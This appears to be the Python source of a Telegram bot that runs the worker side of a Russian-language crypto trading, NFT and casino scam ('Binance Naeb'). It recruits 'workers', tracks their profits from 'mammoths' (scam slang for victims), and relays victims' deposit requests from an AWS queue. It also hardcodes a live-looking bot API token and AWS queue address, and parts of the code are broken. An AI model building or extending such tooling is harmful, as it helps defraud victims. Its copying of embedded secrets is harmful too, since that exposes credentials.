import asyncio
import logging
import time
import json
from  aws import sns, aws_region, aws_access_key_id, aws_secret_access_key
import aiobotocore as aiobotocore
from aiobotocore.config import AioConfig
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.types import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
from aiogram.dispatcher.filters.state import State, StatesGroup
from db import Worker, session, Mammoth
from img import generate_profile_stats_for_worker
from aiobotocore.session import get_session
admin_chat_id  = '881704893'
API_TOKEN = '6686215620:AAHPv-qUVFsAKH4ShiaGNfZWd0fHVYCX2qg'
from aws import  sqs
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


async def process_sqs_messages():
    session = get_session()

    async with session.create_client( service_name = 'sqs',
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=aws_region) as sqs:
        while True:
            response = await sqs.receive_message(
                QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications',
                AttributeNames=['All'],
                MaxNumberOfMessages=1,
                MessageAttributeNames=['All'],
                VisibilityTimeout=0,
                WaitTimeSeconds=0
            )
            try:
                diction = response['Messages'][0]['Body']
                msg_attributes = (json.loads(diction).get('MessageAttributes'))
                print(msg_attributes)
                await bot.send_message(
                    int(msg_attributes['WorkerId']['Value']),
                    f'''💹 Новая заявка на пополнение! (Трейдинг)
                    

🐘 Мамонт: {msg_attributes['FirstName']['Value']} [/t138806]!!
💳 Сумма: {msg_attributes['Sum']['Value']} RUB
                ''', reply_markup=create_top_up_mammonths_balance_button(mammonths_telegram_id=msg_attributes['MammonthId']['Value'], amount=msg_attributes['Sum']['Value'])
                )
                message = response['Messages'][0]
                receipt_handle = message['ReceiptHandle']
                await sqs.delete_message(QueueUrl='https://sqs.eu-north-1.amazonaws.com/441199499768/NewApplications', ReceiptHandle=receipt_handle)

            except Exception as ex:
                print(ex)
            await asyncio.sleep(10)


class QuestionsAndAnswersStates(StatesGroup):
    first = State()
    second = State()
    third = State()

def admin_approval_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton("Разрешить воркеру создать аккаунт", callback_data='approvetocreateaccount'), InlineKeyboardButton(
        'Запретить', callback_data='disapprovetocreateaccount'))




def create_agree_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Согласен с правилами', callback_data='agreewithterms'))


def create_verification_button():
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Проверить верификацию', callback_data='verifyThatUserIsNotUkrainian'))

def create_top_up_mammonths_balance_button(mammonths_telegram_id, amount):
    return InlineKeyboardMarkup().add(InlineKeyboardButton('Пополнить', callback_data='top_up_mammonths_balance', mammonths_telegram_id=mammonths_telegram_id, amount=amount))

    # Создаем клавиатуру
markup = ReplyKeyboardMarkup(resize_keyboard=True)

    # Создаем кнопки и добавляем их к клавиатуре
profile_button = KeyboardButton("Профиль 🐳")
nft_button = KeyboardButton("NFT 💠")
trading_button = KeyboardButton("Трейдинг 📊")
casino_button = KeyboardButton("Казино 🎰")
arbitrage_button = KeyboardButton("Арбитраж 🌐")
about_button = KeyboardButton("О проекте 👨‍💻")

    # Добавляем кнопки к клавиатуре (можно добавить больше кнопок)
markup.add(profile_button, nft_button, trading_button)
markup.add(casino_button, arbitrage_button, about_button)






@dp.message_handler(lambda message: message.text in ["Профиль 🐳", "NFT 💠", "Трейдинг 📊", "Казино 🎰", "Арбитраж 🌐", "О проекте 👨‍💻"])
async def handle_menu(message: types.Message):
    # Обработка нажатия кнопок
    if message.text == "Профиль 🐳":
        await showprofile(message)
    elif message.text == "NFT 💠":
        await message.answer("Вы выбрали 'NFT 💠'")
    elif message.text == "Трейдинг 📊":
        await message.answer("Вы выбрали 'Трейдинг 📊'")
    elif message.text == "Казино 🎰":
        await message.answer("Вы выбрали 'Казино 🎰'")
    elif message.text == "Арбитраж 🌐":
        await message.answer("Вы выбрали 'Арбитраж 🌐'")
    elif message.text == "О проекте 👨‍💻":
        await message.answer("Вы выбрали 'О проекте 👨‍💻'")


async def showprofile(message: types.Message):
    worker = session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first()
    generate_profile_stats_for_worker(str(worker.telegram_id), str(worker.balance), str(worker.profit), str(worker.warnings), worker.payment_method )
    caption = f"""
🗃 Твой профиль [{worker.telegram_id}],  0 уровень!

Код для сервисов: 62954612!

💸 У тебя 0! профитов на сумму {worker.profit} RUB
Средний профит 0 RUB

Приглашено: 0 воркеров!
Баланс: {worker.balance} RUB
Статус: Воркер
Предупреждений: [{worker.warnings}/3]
Способ выплаты: {worker.payment_method}

В команде: 2 дня

🌕 Всё работает, воркаем!
    
    
    
    """


    with open(f'{worker.telegram_id}.png', 'rb') as img:
        await bot.send_photo(chat_id=message.chat.id, photo=InputFile(img), caption=caption, reply_markup=markup)

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if not session.query(Worker).filter(Worker.telegram_id == message.from_user.id).first():
    # Текст с правилами
        rules_text = """
💬 Правила Binance Naeb  💬 

Запрещено:

`🔸 Распространение запрещённых материалов, 18+ GIF/Стикеров/Видео/Фото`
`🔸 Попрошайничество`
`🔸 Реклама сторонних проектов или же услуг`
`🔸 Дезинформация о проекте`
`🔸 Принимать платежи на свои реквизиты`
`🔸 Спамить или тегать стафф, потому что вам не отвечают в лс`
`🔸 Оскорблять национальность/высказывать свои полит взгляды`
`🔸 Использовать любые ТП кроме ботов тимы`
`🔸 Оскорблять любого из представителей администрации`

Вы ознакомились и согласились с правилами проекта ✅
    """

        await  message.answer('⚡', reply_markup=markup)
        msg = await message.reply(rules_text, parse_mode=ParseMode.MARKDOWN, reply_markup=create_agree_button())
    await showprofile(message)

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'agreewithterms')
async def handle_agree_callback(query: types.CallbackQuery):
    await query.message.delete()
    await query.message.answer("Здравствуйте! Пожалуйста, ответьте на следующие вопросы:\n"
                        "1. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на первый вопрос
    await QuestionsAndAnswersStates.first.set()


@dp.message_handler(state=QuestionsAndAnswersStates.first)
async def answer1(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['id'] = message.from_user.id
        data['answer1'] = message.text.lower()
    # Задаем второй вопрос
    await message.reply("2. Откуда Вы узнали о нас?")
    # Устанавливаем состояние ожидания ответа на второй вопрос
    await QuestionsAndAnswersStates.second.set()

@dp.message_handler(state=QuestionsAndAnswersStates.second)
async def answer2(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer2'] = message.text
    # Задаем третий вопрос
    await message.reply("3. У вас есть опыт работы в такой сфере? (Да/Нет)")
    # Устанавливаем состояние ожидания ответа на третий вопрос
    await QuestionsAndAnswersStates.third.set()


@dp.message_handler(state=QuestionsAndAnswersStates.third)
async def answer3(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['answer3'] = message.text.lower()

    # Отправляем ответы администратору
    await bot.send_message(admin_chat_id, f"Ответы пользователя: `{data['id']}` \n"
                                         f"1. Опыт работы в сфере: {data['answer1']}\n"
                                         f"2. Источник информации: {data['answer2']}\n"
                                         f"3. Опыт работы в сфере: {data['answer3']}", parse_mode=ParseMode.MARKDOWN, reply_markup=admin_approval_button())
    # Завершаем состояние
    await state.finish()


@dp.callback_query_handler(lambda callback_query: callback_query.data == 'top_up_mammonths_balance')
async def handle_top_up_mammonths_balance(query: types.CallbackQuery, mammonths_telegram_id, amount):
    mammonth = session.query(Mammoth).filter(Mammoth.telegram_id==mammonths_telegram_id).first()
    mammonth.balance += amount
    session.commit()
    await query.message.answer('Вы оплатили заявку', parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'approvetocreateaccount')
async def handle_approve_callback(query: types.CallbackQuery):
    await bot.send_message(query['from']['id'], "Вы верифицированный пользователь. Теперь вы имеете право пользоваться функциями для воркеров")

    chat_id = query.message.chat.id
    message_id = query.message.message_id
    new_user = Worker(telegram_id=query['from']['id'], name=query['from']['first_name'])
    session.add(new_user)
    session.commit()
    # Удаляем сообщение
    await bot.delete_message(chat_id, message_id)

@dp.callback_query_handler(lambda callback_query: callback_query.data == 'disapprovetocreateaccount')
async def handle_approve_callback(query: types.CallbackQuery):
    await bot.send_message(query['from']['id'], "Вам запрещено пользоваться функциями для воркеров")
    chat_id = query.message.chat.id
    message_id = query.message.message_id

    # Удаляем сообщение
    await bot.delete_message(chat_id, message_id)




if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(process_sqs_messages())
    from aiogram import executor

    storage = MemoryStorage()
    # Подключаем MemoryStorage к боту
    dp.storage = storage
    executor.start_polling(dp, skip_updates=True)
